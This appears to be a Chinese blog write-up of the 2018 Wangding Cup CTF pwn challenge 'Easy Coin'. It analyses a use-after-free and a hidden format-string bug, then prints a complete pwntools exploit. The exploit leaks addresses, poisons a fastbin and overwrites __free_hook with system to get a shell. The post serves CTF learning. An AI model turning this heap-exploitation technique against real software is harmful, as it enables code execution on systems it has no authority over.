---
title: 'Easy Coin:UAF'
date: 2018-09-21 21:48:08
tags: pwn heap
layout: post
---
Easy Coin 网鼎杯

<!--more-->
## 0x00 Analysis
```arm
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
没有开PIE 开partial RElro

程序主要有两个菜单:
![](/18-9-21-1.jpg)
和几个结构体:
![](/18-9-21-2.jpg)
第一层菜单主要是注册，登录，退出
看了一遍感觉没啥大问题
然后再去逆第二层...感觉自己逆向功底太差...逆了半天
```arm
switch ( buf )
      {
        case '1':
          display(ptr);
          break;
        case '2':
          send_coin(ptr);
          break;
        case '3':
          transaction(ptr);
          break;
        case '4':
          chpass(ptr);
          break;
        case '5':
          del(ptr);                             // uaf
          inuse = 0;
          break;
        case '6':
          inuse = 0;
          break;
        default:
          printf("[-] Unknown Command: ", &buf);
          printf(&buf);                         // fmtstr
          break;
      }
```
主要功能如上
最后偷偷藏了个4bytes的fmtstr
经过测试发现可以泄露stack(off=1),heap(0ff=9),libc(off=3)
然后分析了一圈除了在delet的时候感觉有些不妥:heap内数据未清0其他感觉还是没啥明显的问题的。
于是就做不出来了...看了P4nda师傅的wp才做出来的...
# 0x01 漏洞挖掘
漏洞点在于 option的free过程中，如果自己对自己转账，
那么自己的option里面有两个id相同的option删除的时候会产生doublefree或者删除可以算计目标的chunk.
----这样看看理解起来比较麻烦，最好动手调一下主要是后24位是0x100的chunk...
# 0x02 漏洞利用
创建两个用户-->
登录一个-->
通过fmtstr泄露地址--->
先正常交易一次--->(为了之后可以刚好b被free的地址会是用户二的passwd)
删除当前用户--->
创建并登录--->
正常交易，然后给自己转钱--->
删除用户---> 此时能free最后24位为0x100的地址--->
又因为可以通过修改密码操作修改0x100的内容造成了fastbin的fd的污染可以得到某fakechunk(size=30)的写权限

后面可以写一个用户的passwd指针指向freehook然后改成system...


我的脑子想起这个来比较麻烦....需要一步一步调试
# 0x03 EXP

```python
from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def reg(name,passwd):
	cmd(1)
	p.sendlineafter("> ",name)
	p.sendlineafter("> ",passwd)
	p.sendlineafter("> ",passwd)
def login(name,passwd):
	cmd(2)
	p.sendlineafter("me\n> ",name)
	p.sendlineafter("> ",passwd)
def fmt(n):
	p.sendafter("> ","%{}$n".format(str(n)))
def sendcoin(name,count):
	cmd(2)
	p.sendlineafter("> ",name)
	p.sendlineafter("> ",str(count))
def remove():
	cmd(5)
def cp(pwd):
	cmd(4)
	p.sendlineafter("> ",pwd)
context.log_level="debug"
passwd="\0"*0x10+"\x02"+7*"\0"
atoi_got=0x603088

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./EasyCoin")
reg("A","A")
reg("/bin/sh",passwd)
login("A","A")
#####################################################################################################
cmd("%p")
p.readuntil("Command: ")
data=p.readline()
stack=int(data[:-1],16)-(0x7fffffffb4e0-0x7ffffffde000)
p.sendafter("> ","%3$p")
p.readuntil("Command: ")
data=p.read(14)
base=int(data,16)-(0x7ffff7b042c0-0x7ffff7a0d000)

p.sendafter("> ","%9$p")
p.readuntil("Command: ")
data=p.read(8)
heap=int(data,16)-(0x10)
log.warning(hex(stack))
log.success(hex(base))
log.info(hex(heap))
#leak over#
sendcoin("/bin/sh",0xdead)
remove()
reg("nier","A")
login("nier","A")
sendcoin("/bin/sh",heap+0x100)
sendcoin("nier",0xdad)
remove()
#start uaf #
libc.address=base
login("/bin/sh",p64(heap+0x30))
sendcoin("/bin/sh",1)
cp(p64(heap+0xa0-0x10))
cmd(6)
payload=p64(heap+0xd0)+p64(libc.symbols['__free_hook'])
cmd(1)
p.sendlineafter("> ","C")
p.sendafter("> ",payload)
p.sendafter("> ",payload)
#gdb.attach(p,'''b *0x4014bb''')
login("/bin/sh","")
cp(p64(libc.symbols['system']))
remove()
p.interactive()
```

# Review 
遇到UAF先去想办法利用脏数据而不是先去套fastbinatk或者unsortedbinatk...熟悉题目中的数据结构和功能的流程